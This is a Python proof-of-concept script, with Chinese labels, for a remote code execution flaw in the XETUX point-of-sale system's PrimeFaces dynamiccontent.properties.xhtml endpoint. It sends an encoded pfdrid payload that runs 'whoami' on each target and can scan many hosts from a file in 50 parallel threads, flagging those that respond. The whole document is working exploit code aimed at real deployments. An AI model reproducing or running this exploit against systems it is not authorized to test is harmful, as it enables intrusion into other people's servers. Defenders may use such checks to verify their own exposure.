import requests
import argparse
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description="XETUX 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    pool = Pool(50)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            args.url = f"http://{args.url}"
            check(args.url)
    elif args.file:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
        pool.map(check, targets)
        pool.close()


def check(target):
    url = f"{target}/xc-one-pos/javax.faces.resource/dynamiccontent.properties.xhtml"
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q = 0.9,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate, br',
        'Connection':'close',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    data = {
        'pfdrt':'sc',
        'ln':'primefaces',
        'pfdrid':'4xE5s8AClZxUxmyaZjpBstMXUalIgOJHOtvxel/v4YXvibdOn52ow4M6lDaKd9Gb8JdQqbACZNWVZpVS+3sX1Hoizouty1mYYT4yJsKPnUZ0LUHDvN0GB5YLgX1PkNY+1ZQ/nOSg5J1LDyzAjBheAxLDODIVcHkmJ6hnJsQ0YQ8bMU5++TqeD4BGqCZMDjP+ZQvveiUhxsUC/+tPqnOgFSBV8TBjDSPNmVoQ9YcKTGelKuJjS2kCXHjcyz7PcQksSW6UUmKu9RhJ+x3Mnx6j56eroVPWnM2vdYRt5An6cLo1YPXu9uqriyg1wgm/7xYP/UwP1q8wfVeyM4fOw2xJzP6i1q4VLHLXi0VYHAIgaPrZ8gH8XH4X2Kq6ewyrJ62QxBF5dtE3tvLAL5tpGxqek5VW+hZFe9ePu0n5tLxWmqgqni8bKGbGrGu4IhXhCJhBxyelLQzPGLCfqmiQwYX5Ime9EHj1k5eoWQzH8jb3kQfFJ0exVprGCfXKGfHyfKfLEOd86anNsiQeNavNL7cDKV0yMbz52n6WLQrCAyzulE8kBCZPNGIUJh24npbeaHTaCjHRDtI7aIPHAIhuMWn7Ef5TU9DcXjdJvZqrItJoCDrtxMFfDhb0hpNQ2ise+bYIYzUDkUtdRV+jCGNI9kbPG5QPhAqp/JBhQ+XsqIhsu4LfkGbt51STsbVQZvoNaNyukOBL5IDTfNY6wS5bPSOKGuFjsQq0Xoadx1t3fc1YA9pm/EWgyR5DdKtmmxG93QqNhZf2RlPRJ5Z3jQAtdxw+xBgj6mLY2bEJUZn4R75UWnvLO6JM918jHdfPZELAxOCrzk5MNuoNxsWreDM7e2GX2iTUpfzNILoGaBY5wDnRw46ATxhx6Q/Eba5MU7vNX1VtGFfHd2cDM5cpSGOlmOMl8qzxYk1R+A2eBUMEl8tFa55uwr19mW9VvWatD8orEb1RmByeIFyUeq6xLszczsB5Sy85Y1KPNvjmbTKu0LryGUc3U8VQ7AudToBsIo9ofMUJAwELNASNfLV0fZvUWi0GjoonpBq5jqSrRHuERB1+DW2kR6XmnuDdZMt9xdd1BGi1AM3As0KwSetNq6Ezm2fnjpW877buqsB+czxMtn6Yt6l88NRYaMHrwuY7s4IMNEBEazc0IBUNF30PH+3eIqRZdkimo980HBzVW4SXHnCMST65/TaIcy6/OXQqNjpMh7DDEQIvDjnMYMyBILCOCSDS4T3JQzgc+VhgT97imje/KWibF70yMQesNzOCEkaZbKoHz498sqKIDRIHiVEhTZlwdP29sUwt1uqNEV/35yQ+O8DLt0b+jqBECHJzI1IhGvSUWJW37TAgUEnJWpjI9R1hT88614GsVDG0UYv0u8YyS0chh0RryV3BXotoSkSkVGShIT4h0s51Qjswp0luewLtNuVyC5FvHvWiHLzbAArNnmM7k/GdCn3jLe9PeJp7yqDzzBBMN9kymtJdlm7c5XnlOv+P7wIJbP0i4+QF+PXw5ePKwSwQ9v8rTQ==',
        'cmd':'whoami'
    }

    response = requests.post(url,data=data, headers=headers, verify=False, timeout=3)
    try:
        if response.status_code == 200 and 'system' in response.text:
            print(f"[*] {target} 存在漏洞")
        else:
            print(f"[!] {target} 不存在漏洞")
    except Exception as e:
        print(f"[Error] {target} TimeOut")


if __name__ == '__main__':
    main()